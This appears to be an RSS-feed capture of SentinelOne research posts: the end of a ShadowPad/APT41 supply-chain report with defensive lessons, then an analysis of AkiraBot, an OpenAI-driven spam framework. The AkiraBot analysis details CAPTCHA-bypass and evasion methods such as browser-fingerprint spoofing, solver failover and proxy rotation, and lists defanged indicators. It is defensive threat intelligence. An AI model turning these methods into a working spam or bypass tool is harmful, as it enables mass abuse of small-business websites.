<p>The ShadowPad samples we retrieved were obfuscated using <a href="https://cloud.google.com/blog/topics/threat-intelligence/scatterbrain-unmasking-poisonplug-obfuscator" target="_blank" rel="noopener noreferrer">ScatterBrain</a>, an evolution of the <a href="https://www.pwc.co.uk/issues/cyber-security-services/insights/chasing-shadows.html" target="_blank" rel="noopener noreferrer">ScatterBee</a> obfuscation mechanism. Our industry partner, Google Threat Intelligence Group (GTIG), have also observed the use of ScatterBrain-obfuscated ShadowPad samples since 2022 and attribute them to clusters associated with the suspected Chinese APT actor, APT41.</p>
<figure id="attachment_120058" aria-describedby="caption-attachment-120058" style="width: 586px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9.jpg" alt="GTIG APT41 Use of ScatterBrain" width="586" height="117" class="size-full wp-image-120058" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9.jpg 586w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9-300x60.jpg 300w" sizes="auto, (max-width: 586px) 100vw, 586px" /><figcaption id="caption-attachment-120058" class="wp-caption-text">GTIG APT41 Use of ScatterBrain</figcaption></figure>
<p>Investigations continue in determining the specific actor overlap between June 2024 ShadowPad intrusions and the later PurpleHaze activity. We do not rule out the involvement of the same threat cluster, particularly given the extensive sharing of malware, infrastructure, and operational practices among Chinese threat groups, as well as the possibility of access transfer between different actors.</p>
<p>Based on private telemetry, we identified a large collection of victim organizations compromised using ScatterBrain-obfuscated ShadowPad. Between July 2024 and March 2025, this malware was used in intrusions at over 70 organizations across various regions globally, spanning sectors such as manufacturing, government, finance, telecommunications, and research. We assess that the threat actor primarily gained initial foothold in the majority of these organizations by exploiting an n-day vulnerability in CheckPoint gateway devices, which aligns with <a href="https://www.orangecyberdefense.com/global/blog/cert-news/meet-nailaolocker-a-ransomware-distributed-in-europe-by-shadowpad-and-plugx-backdoors" target="_blank" rel="noopener noreferrer">previous research</a> on ShadowPad intrusions involving the deployment of ransomware.</p>
<p>Among the victims, we identified the previously mentioned IT services and logistics organization that was at the time responsible for managing hardware logistics for SentinelOne employees. Victim organizations were promptly informed of intrusion specifics, which were swiftly investigated. At this point, it remains unclear whether the perpetrators&#8217; focus was solely on the compromised organization or if they intended to extend their reach to client organizations as well.</p>
<p>A detailed investigation into SentinelOne&#8217;s infrastructure, software, and hardware assets found no evidence of secondary compromise. Nevertheless, this case underscores the fragility of the larger supplier ecosystem that organizations depend upon and the persistent threat posed by suspected Chinese threat actors, who continuously seek to establish <a href="https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/" target="_blank" rel="noopener noreferrer">strategic footholds</a> to potentially compromise downstream entities.</p>
<p>SentinelLABS will share a detailed public release on this topic in due course, providing further technical information on these activities, including observed TTPs, malware, and infrastructure.</p>
<h3>Lessons Learned While Hardening Our Operational Ecosystem</h3>
<p>Our analysis of the PurpleHaze cluster, and more specifically the potential indirect risk introduced via compromised third-party service providers, has reinforced several key insights around operational security and supply chain monitoring. Even when our own infrastructure remained untouched, the targeting of an external service provider previously associated with business logistics surfaced important considerations.</p>
<p>One immediate reminder is the necessity of maintaining real-time awareness not only over internal assets but also over adjacent service providers—particularly those with past or current access to sensitive employee devices or logistical information. When incidents occur near your supply chain, don’t wait for confirmation of compromise. Proactively trigger internal reviews of asset inventories, procurement workflows, OS images and onboarding deployment scripts, and segmentation policies to quickly identify any exposure pathways and reduce downstream risk.</p>
<p>This leads to several defense recommendations:</p>
<ul>
<li aria-level="1"><strong>Distribute Threat Intelligence Across Operational Stakeholders</strong><br />
Organizations should proactively share campaign-level threat intelligence with business units beyond the traditional security org—particularly those managing vendor relationships, logistics, and physical operations. Doing so enables faster detection of overlap with compromised third parties and supports early reassessment of exposure through external partners.</li>
<li aria-level="1"><strong>Integrate Threat Context Into Asset Attribution Workflows</strong><br />
Infrastructure and IT teams should collaborate with threat intelligence functions to embed threat-aware metadata into asset inventories. This enables more responsive scoping during incident response and enhances the ability to trace supply chain touchpoints that may be at risk.</li>
<li aria-level="1"><strong>Expand Supply Chain Threat Modeling</strong><br />
Organizations should refine their threat modeling processes to explicitly account for upstream supply chain threats, especially those posed by nation-state actors with a history of leveraging contractors, vendors, or logistics partners as indirect access vectors. Tailoring models to include adversary-specific tradecraft enables earlier identification of unconventional intrusion pathways.</li>
</ul>
<p>While attribution continues to evolve and victim impact remains diverse, one thing is clear: well-resourced threat actors are increasingly leaning on indirect routes into enterprise environments. Investigations like this help us sharpen our defenses—not just around traditional digital perimeters but around the full operational footprint of our organization.</p>
<h2>The Strategic Value of Cyber Threat Intelligence</h2>
<p>In today’s threat landscape, threat intelligence has evolved from a niche function into an essential pillar of enterprise defense—particularly for private sector organizations operating in the security space. As threat actors increasingly target security vendors for insider access, abuse of legitimate channels, and supply chain infiltration, the role of CTI in anticipating and disrupting these tactics has become more critical than ever.</p>
<p>One of the most tangible examples of this value is in internal talent acquisition and insider threat defense. Intelligence has become a frontline asset in identifying attempts by North Korean IT workers and other state-backed operatives to embed themselves in organizations under false pretenses. By flagging suspicious applicant patterns, cross-referencing alias histories, and tracking known tradecraft, CTI teams help hiring managers and HR avoid potential insider incidents before they start.</p>
<p>Our CTI capabilities must also directly support sales and channel operations. As criminal groups increasingly impersonate legitimate businesses to acquire security products through trusted resellers, intelligence plays a key role in verifying customer legitimacy and identifying anomalous purchase behaviors. By integrating intelligence insights into pre-sale vetting workflows, a crucial layer of protection is helping to ensure adversaries cannot simply “buy” their way into our technology stack.</p>
<p>Internally, threat intelligence informs and enhances how we defend our own technology and supply chain against highly targeted APT activity. From understanding how adversaries reverse-engineer our software to uncovering which parts of our technology stack they seek to compromise, CTI enables proactive hardening, smarter telemetry prioritization, and meaningful collaboration with product and engineering teams. In essence, intelligence acts as an early-warning system and a strategic guide—ensuring our defenses stay one step ahead of evolving threats.</p>
<p>Across every function—whether it&#8217;s HR, Sales, Engineering, or Security—cyber threat intelligence is no longer a backroom function. It&#8217;s embedded in the fabric of how we defend, operate, and grow as a business.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTier_soc_ftr.jpg" length="224159" type="image/jpeg" />	</item>
		<item>
		<title>AkiraBot &#124; AI-Powered Bot Bypasses CAPTCHAs, Spams Websites At Scale</title>
		<link>https://www.sentinelone.com/labs/akirabot-ai-powered-bot-bypasses-captchas-spams-websites-at-scale/</link>
		
		<dc:creator><![CDATA[Alex Delamotte &amp; Jim Walter]]></dc:creator>
		<pubDate>Wed, 09 Apr 2025 15:00:36 +0000</pubDate>
				<category><![CDATA[MalSpam]]></category>
		<category><![CDATA[OpenAI]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=117809</guid>

					<description><![CDATA[AkiraBot uses OpenAI to generate custom outreach messages to spam chat widgets and website contact forms at scale.]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">AkiraBot is a framework used to spam website chats and contact forms <em>en masse</em> to promote a low-quality SEO service.</li>
<li aria-level="1">SentinelLABS assesses that AkiraBot has targeted more than 400,000 websites and successfully spammed at least 80,000 websites since September 2024.</li>
<li aria-level="1">The bot uses OpenAI to generate custom outreach messages based on the purpose of the website.</li>
<li aria-level="1">The framework is modular and sophisticated compared to typical spam tools, employing multiple CAPTCHA bypass mechanisms &amp; network detection evasion techniques.</li>
</ul>
<h2>Overview</h2>
<p>Whenever a new form of digital communications becomes prevalent, actors inevitably adopt it for spam to try to profit from unsuspecting users. Email has been the perennial choice for spam delivery, but the prevalence of new communications platforms has expanded the spam attack surface considerably.</p>
<p>This report explores AkiraBot, a Python framework that targets small to medium sized business website contact forms and chat widgets. AkiraBot is designed to post AI-generated spam messages tailored to the targeted website’s content that shill the services for a dubious Search Engine Optimization (SEO) network. The use of LLM-generated content likely helps these messages bypass spam filters, as the spam content is different each time a message is generated. The framework also rotates which attacker-controlled domain is supplied in the messages, further complicating spam filtering efforts.</p>
<p>The bot creator has invested significant effort into evading CAPTCHA filters as well as avoiding network detections by relying on a proxy service generally marketed towards advertisers–though the service has had considerable interest and use by cybercriminal actors.</p>
<p>AkiraBot is not related to the ransomware group Akira; this name was chosen due to the bot’s consistent use of domains that use “Akira” as the SEO service brand.</p>
<h2>Script Execution and Website Feature Targeting</h2>
<p>SentinelLABS identified several archives containing scripts related to this framework with file timestamps dating back to September 2024. The oldest archive refers to the bot as Shopbot, likely a reference to its targeting of websites using Shopify. As the tool evolved, the targeting expanded to include websites built using GoDaddy and Wix, as well as generic website contact forms, which includes websites built using Squarespace, and likely other technologies. These technologies are primarily used by small- to medium-sized businesses for their ease in enabling website development with integrations for eCommerce, website content management, and business service offerings.</p>
<p>There are many versions of this tool with file timestamps in the archives indicating activity between September 2024 to present. Each version uses one of two hardcoded OpenAI API keys and the same proxy credentials and test sites, which links the archives despite the disparate naming conventions. We identified AkiraBot-related archives that had the following root directory names:</p>
<ul>
<li aria-level="1">bubble_working_clone</li>
<li aria-level="1">fingerprints-server</li>
<li aria-level="1">GoDaddy</li>
<li aria-level="1">NextCaptcha and FastCaptcha</li>
<li aria-level="1">NextCaptchaBot-v6</li>
<li aria-level="1">override</li>
<li aria-level="1">petar_bot</li>
<li aria-level="1">shopbotpyv2</li>
<li aria-level="1">SHOPIFY_SYSTEM_UPDATED</li>
<li aria-level="1">updatedpybot</li>
<li aria-level="1">wix</li>
<li aria-level="1">wixbot</li>
<li aria-level="1">WORKING_FOLDER</li>
</ul>
<p>Additionally, logs from the tool reveal that the operator ran it from the following paths, suggesting that they are most likely using Windows Server systems based on the Administrator username being the most prevalent:</p>
<pre>
 	C:/Users/Administrator/Desktop/
 	C:/Users/Administrator/Downloads/
 	C:/Users/Usuario/Desktop/ - only appears in the archive named GoDaddy
</pre>
<p>Originally, AkiraBot spammed website contact forms enticing the site owner to purchase SEO services. Newer versions of AkiraBot have also targeted the Live Chat widgets integrated into many websites, including Reamaze widgets.</p>
<figure id="attachment_117818" aria-describedby="caption-attachment-117818" style="width: 929px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6.jpg" alt="_submit_old_website function in v14.py" width="929" height="363" class="size-full wp-image-117818" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6.jpg 929w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6-300x117.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6-768x300.jpg 768w" sizes="auto, (max-width: 929px) 100vw, 929px" /><figcaption id="caption-attachment-117818" class="wp-caption-text"><em>_submit_old_website</em> function in <em>v14.py</em></figcaption></figure>
<p>The bot has a GUI that shows success metrics and lets the operator choose a target list to run against. The GUI lets the operator customize how many threads are running at once, a feature the bot uses to target many sites concurrently.</p>
<figure id="attachment_117827" aria-describedby="caption-attachment-117827" style="width: 1002px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_18.jpg" alt="AkiraBot GUI" width="1002" height="749" class="size-full wp-image-117827" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_18.jpg 1002w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_18-300x224.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_18-768x574.jpg 768w" sizes="auto, (max-width: 1002px) 100vw, 1002px" /><figcaption id="caption-attachment-117827" class="wp-caption-text">AkiraBot GUI</figcaption></figure>
<h3>Spam Message Generation</h3>
<p>Searching for websites referencing AkiraBot domains shows that the bot previously spammed websites in a way that the message was indexed by search engines.</p>
<figure id="attachment_117836" aria-describedby="caption-attachment-117836" style="width: 669px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_10.jpg" alt="Google search results containing useakira[.]com" width="669" height="566" class="size-full wp-image-117836" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_10.jpg 669w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_10-300x254.jpg 300w" sizes="auto, (max-width: 669px) 100vw, 669px" /><figcaption id="caption-attachment-117836" class="wp-caption-text">Google search results containing <em>useakira[.]com</em></figcaption></figure>
<figure id="attachment_117824" aria-describedby="caption-attachment-117824" style="width: 1208px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20.jpg" alt="Spam comment on website from 2023 and content from AkiraBot templates.txt file" width="1208" height="578" class="size-full wp-image-117824" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20.jpg 1208w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20-300x144.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20-1024x490.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20-768x367.jpg 768w" sizes="auto, (max-width: 1208px) 100vw, 1208px" /><figcaption id="caption-attachment-117824" class="wp-caption-text">Spam comment on website from 2023 and content from AkiraBot <em>templates.txt</em> file</figcaption></figure>
<p>AkiraBot creates custom spam messages for targeted websites by processing a template that contains a generic outline of the type of message the bot should send.</p>
<figure id="attachment_117834" aria-describedby="caption-attachment-117834" style="width: 1038px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12.jpg" alt="Spam message template" width="1038" height="342" class="size-full wp-image-117834" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12.jpg 1038w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12-300x99.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12-1024x337.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12-768x253.jpg 768w" sizes="auto, (max-width: 1038px) 100vw, 1038px" /><figcaption id="caption-attachment-117834" class="wp-caption-text">Spam message template</figcaption></figure>
<p>The template is processed by a prompt sent to the OpenAI chat API to generate a customized outreach message based on the contents of the website. The OpenAI client uses model gpt-4o-mini and is assigned the role &#8220;<i>You are a helpful assistant that generates marketing messages.</i>&#8221; and the prompt instructs the LLM to replace the variables <code>&lt;WEBSITE_NAME></code> and <code>&lt;KEYWORD></code> with the site name provided at runtime.</p>
<figure id="attachment_117832" aria-describedby="caption-attachment-117832" style="width: 1186px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14.jpg" alt="AI Chat prompt from v10.py" width="1186" height="677" class="size-full wp-image-117832" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14.jpg 1186w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14-300x171.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14-1024x585.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14-768x438.jpg 768w" sizes="auto, (max-width: 1186px) 100vw, 1186px" /><figcaption id="caption-attachment-117832" class="wp-caption-text">AI Chat prompt from <em>v10.py</em></figcaption></figure>
<p>The <code>&lt;KEYWORD></code> is generated by processing the <code>{context}</code> variable, which contains text scraped from the targeted website via <a href="https://www.crummy.com/software/BeautifulSoup/" target="_blank">BeautifulSoup</a>, a library that transforms raw HTML code into human–or LLM–readable text.</p>
<figure id="attachment_117817" aria-describedby="caption-attachment-117817" style="width: 1059px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7.jpg" alt="AkiraBot generate_message function" width="1059" height="680" class="size-full wp-image-117817" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7.jpg 1059w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7-300x193.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7-1024x658.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7-768x493.jpg 768w" sizes="auto, (max-width: 1059px) 100vw, 1059px" /><figcaption id="caption-attachment-117817" class="wp-caption-text">AkiraBot&#8217;s <em>generate_message</em> function</figcaption></figure>
<p>The resulting message includes a brief description of the targeted website, making the message seem curated. The benefit of generating each message using an LLM is that the message content is unique and filtering against spam becomes more difficult compared to using a consistent message template which can trivially be filtered.</p>
<figure id="attachment_117835" aria-describedby="caption-attachment-117835" style="width: 1059px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11.jpg" alt="Logged AI-generated outreach messages in submissions.csv" width="1059" height="670" class="size-full wp-image-117835" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11.jpg 1059w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11-300x190.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11-1024x648.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11-768x486.jpg 768w" sizes="auto, (max-width: 1059px) 100vw, 1059px" /><figcaption id="caption-attachment-117835" class="wp-caption-text">Logged AI-generated outreach messages in <em>submissions.csv</em></figcaption></figure>
<h2>CAPTCHA Bypass &amp; Network Evasion Techniques</h2>
<h3>CAPTCHA Bypass</h3>
<p>AkiraBot puts significant emphasis on evading CAPTCHAs so that it can spam websites at scale. The targeted CAPTCHA services include hCAPTCHA and reCAPTCHA, including Cloudflare’s hCAPTCHA service in certain versions of the tool.</p>
<p>We identified an archive with files for CAPTCHA-related servers and browser fingerprints, which allow the bot’s web traffic to mimic a legitimate end user. The archives contain a fingerprint server that runs on the same system as the other AkiraBot tools and intercepts the website loading processes using Selenium <a href="https://www.selenium.dev/documentation/webdriver/" target="_blank" rel="noopener noreferrer">WebDriver</a>, an automation framework that simulates user browsing activity.</p>
<p>The <code>inject.js</code> script injects code into the targeted website’s Document Object Model (DOM) which enables the tool to modify how the website loads in real time and change behaviors. <code>inject.js</code> manipulates values in the session via a headless Chrome instance that makes the session appear like an end user’s browser to the webserver. The script modifies multiple browser attributes that webservers use to identify the nature of the browser viewing the website, including:</p>
<ul>
<li aria-level="1">Audio Context and Voice engines, which are used to profile whether a session is headless or a real browser</li>
<li aria-level="1">Graphics rendering, including canvas and WebGL attributes</li>
<li aria-level="1">Installed fonts</li>
<li aria-level="1"><a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator" target="_blank" rel="noopener noreferrer">Navigator</a> objects, which provide a wealth of profiling information, such as browser type, operating system &amp; architecture, geolocation, hardware details, languages installed, and browser privacy settings</li>
<li aria-level="1">System memory, storage, and CPU profile</li>
<li aria-level="1">Timezone</li>
</ul>
<p>The bot uses several CAPTCHA bypassing services, including Capsolver, FastCaptcha, and NextCaptcha, which are failover services for when browser emulation is insufficient to interact with the targeted website.</p>
<figure id="attachment_117819" aria-describedby="caption-attachment-117819" style="width: 1254px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4.jpg" alt="FastCaptcha token generator function in v10.py" width="1254" height="630" class="size-full wp-image-117819" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4.jpg 1254w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4-300x151.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4-1024x514.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4-768x386.jpg 768w" sizes="auto, (max-width: 1254px) 100vw, 1254px" /><figcaption id="caption-attachment-117819" class="wp-caption-text">FastCaptcha token generator function in <em>v10.py</em></figcaption></figure>
<p>AkiraBot also runs a headless Chrome instance to refresh values for <a href="https://support.reamaze.com/kb/automation/enable-ai-spam-filtering-for-chat-and-email-channels" target="_blank" rel="noopener noreferrer">Reamaze</a> tokens periodically. Reamaze provides websites with customer support chat integrations, making this another targeted feature. The service also offers spam filters for chats on its platform, indicating that this is a known vector for spam attacks.</p>
<figure id="attachment_117821" aria-describedby="caption-attachment-117821" style="width: 736px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_23.jpg" alt="Reamaze token handling function" width="736" height="419" class="size-full wp-image-117821" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_23.jpg 736w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_23-300x171.jpg 300w" sizes="auto, (max-width: 736px) 100vw, 736px" /><figcaption id="caption-attachment-117821" class="wp-caption-text">Reamaze token handling function</figcaption></figure>
<h3>Network Evasion Techniques</h3>
<p>AkiraBot uses many different proxy hosts to evade network detections and diversify the source of where its traffic comes from. In each archive SentinelLABS analyzed, AkiraBot used the SmartProxy service. SmartProxy’s website claims that its proxies are ethically sourced and that they provide data center, mobile, and residential proxies. Each version of the bot uses the same proxy credentials, suggesting the same actor is behind each iteration.</p>
<figure id="attachment_117826" aria-describedby="caption-attachment-117826" style="width: 649px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_19.jpg" alt="get_random_proxy function in The_NextCaptcha_Bot.py" width="649" height="288" class="size-full wp-image-117826" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_19.jpg 649w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_19-300x133.jpg 300w" sizes="auto, (max-width: 649px) 100vw, 649px" /><figcaption id="caption-attachment-117826" class="wp-caption-text"><em>get_random_proxy</em> function in <em>The_NextCaptcha_Bot.py</em></figcaption></figure>
<p>While SmartProxy is a service that seems to operate within legal boundaries, it is worth noting that it has regularly had the attention of cybercriminals. The BlackBasta ransomware leaks referenced an exchange of SmartProxy credentials, for example.</p>
<figure id="attachment_117828" aria-describedby="caption-attachment-117828" style="width: 1216px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17.jpg" alt="SmartProxy credentials from BlackBasta leaks" width="1216" height="306" class="size-full wp-image-117828" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17.jpg 1216w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17-300x75.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17-1024x258.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17-768x193.jpg 768w" sizes="auto, (max-width: 1216px) 100vw, 1216px" /><figcaption id="caption-attachment-117828" class="wp-caption-text">SmartProxy credentials from BlackBasta leaks</figcaption></figure>
<h2>Logging &amp; Success</h2>
<p>AkiraBot logs its spam progress to <code>submissions.csv</code>, which sometimes includes the AI-generated spam message contents as well. The <code>submissions.csv</code> file from the January 2025 archives show more than 80,000 unique domains that were successfully spammed. The script also logs failed attempts in <code>failed.txt</code> and <code>failed_old.txt</code>. The January 2025 archives showed that only 11,000 domains had failed, including previous runs of the tool. We analyzed all <code>submissions.csv</code> files; deduplicating the results revealed that more than 420,000 unique domains were targeted in total.</p>
<p>Two versions of AkiraBot used a Telegram bot for logging success metrics. The scripts <code>monitor.py</code> and <code>monitor_random.py</code> would collect success metrics from the bot and post them to a Telegram channel via API.</p>
<figure id="attachment_117823" aria-describedby="caption-attachment-117823" style="width: 853px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_21.jpg" alt="Telegram sending functionality in monitor.py" width="853" height="403" class="size-full wp-image-117823" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_21.jpg 853w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_21-300x142.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_21-768x363.jpg 768w" sizes="auto, (max-width: 853px) 100vw, 853px" /><figcaption id="caption-attachment-117823" class="wp-caption-text">Telegram sending functionality in <em>monitor.py</em></figcaption></figure>
<h2>Telegram Detail</h2>
<p>The Telegram functionality, contained in the <code>monitor.py</code> and <code>monitor_random.py</code> scripts, is tied into proxy rotation and CAPTCHA defeat features contained within the bundled JavaScript file <code>script.js</code>.  The <code>monitor.py</code> script utilizes <code>pyautogui</code> to paste the contents of <code>script.js</code> into a browser developer console by scripting CTRL+SHIFT+J, followed by the paste command, eventually executing the JavaScript within the browser console.</p>
<figure id="attachment_117837" aria-describedby="caption-attachment-117837" style="width: 337px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_1.jpg" alt="pyautogui actions in monitor.py" width="337" height="369" class="size-full wp-image-117837" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_1.jpg 337w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_1-274x300.jpg 274w" sizes="auto, (max-width: 337px) 100vw, 337px" /><figcaption id="caption-attachment-117837" class="wp-caption-text"><em>pyautogui</em> actions in <em>monitor.py</em></figcaption></figure>
<p>The pasted and executed JavaScript is then responsible for attempting CAPTCHA refreshes and defeats on targeted URLs, reporting the status returned to a JSON file, <code>stats.json</code>. If a proxy rotation is required, to aid further in refreshing the CAPTCHA defeat attempts on a given URL, the <code>monitor.py</code> script handles this as well, rotating the used proxy though the iproxyonline service (<code>fxdx[.]in</code>).</p>
<p>Proxy rotation is generally enabled to avoid geographic or IP-based restrictions when repeatedly attempting to refresh and defeat CAPTCHAs. The Telegram status updates specifically report on proxy rotations and CAPTCHA submissions. Some versions of these scripts have the proxy rotation section commented out, indicating that it is an optional feature.</p>
<figure id="attachment_118102" aria-describedby="caption-attachment-118102" style="width: 702px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_22v2.jpg" alt="Telegram message submission + proxy rotation status in monitor.py" width="702" height="564" class="size-full wp-image-118102" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_22v2.jpg 702w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_22v2-300x241.jpg 300w" sizes="auto, (max-width: 702px) 100vw, 702px" /><figcaption id="caption-attachment-118102" class="wp-caption-text">Telegram message submission + proxy rotation status in <em>monitor.py</em></figcaption></figure>
<p>All of the analyzed <code>monitor.py</code> and <code>monitor_random.py</code> scripts contain the same Telegram token and <code>chat_id</code> combination.</p>
<figure id="attachment_118103" aria-describedby="caption-attachment-118103" style="width: 502px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_15v2.jpg" alt=" Telegram bot data in monitor.py" width="502" height="108" class="size-full wp-image-118103" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_15v2.jpg 502w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_15v2-300x65.jpg 300w" sizes="auto, (max-width: 502px) 100vw, 502px" /><figcaption id="caption-attachment-118103" class="wp-caption-text">Telegram bot data in <em>monitor.py</em></figcaption></figure>
<p>This Telegram <code>chat_id</code> is associated with the following Telegram user data:</p>
<pre>
(bot) username: htscasdasdadwoobot
Firstname: Shadow / hts
LastName: a_zarkawi
</pre>
<figure id="attachment_117829" aria-describedby="caption-attachment-117829" style="width: 511px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_16.jpg" alt="HTS Telegram bot referenced in monitor.py scripts" width="511" height="239" class="size-full wp-image-117829" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_16.jpg 511w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_16-300x140.jpg 300w" sizes="auto, (max-width: 511px) 100vw, 511px" /><figcaption id="caption-attachment-117829" class="wp-caption-text">HTS Telegram bot referenced in monitor.py scripts</figcaption></figure>
<h2>Infrastructure</h2>
<p>The spam messages frequently rotate the domain used, likely in an attempt to avoid detection. The oldest domain in use is <code>akirateam[.]com</code>, which was registered in January 2022 on a Germany-based IP, <code>91.195.240[.]94</code>, without further updates until March 2023. The second oldest domain is <code>goservicewrap[.]com</code>, which was registered in April 2024 and resolved to <code>86.38.202[.]110</code>, a Hostinger IP in Cyprus.</p>
<p>Several AkiraBot domains have interesting connections through historical DNS activity. The subdomain <code>mail.servicewrap-go[.]com</code> briefly shared a CNAME record pointing to <code>77980.bodis[.]com</code>, which is associated with various malicious activities, including a 2023 malvertising <a href="https://blog.sucuri.net/2023/07/malicious-injection-redirects-traffic-to-parked-domain.html" target="_blank" rel="noopener noreferrer">campaign</a>. This domain also received communications from several Windows executable files that were detected as various banking trojans.</p>
<p>An odd relationship stood out in anchor links referencing <code>77980.bodis[.]com</code>: the website <code>unj[.]digital</code> contained anchor links from December 2024 through February 2025 pointing to <code>77980.bodis[.]com</code>. UNJ Digital&#8217;s website describes itself as a digital marketing and software development firm. The subdomain <code>smtp.unj[.]digital</code> also has a CNAME record pointing to <code>77980.bodis[.]com</code>, fortifying a connection between these hosts. While the website now highlights offering digital content services, as of late 2024 the site showed a focus on increasing marketing revenue.</p>
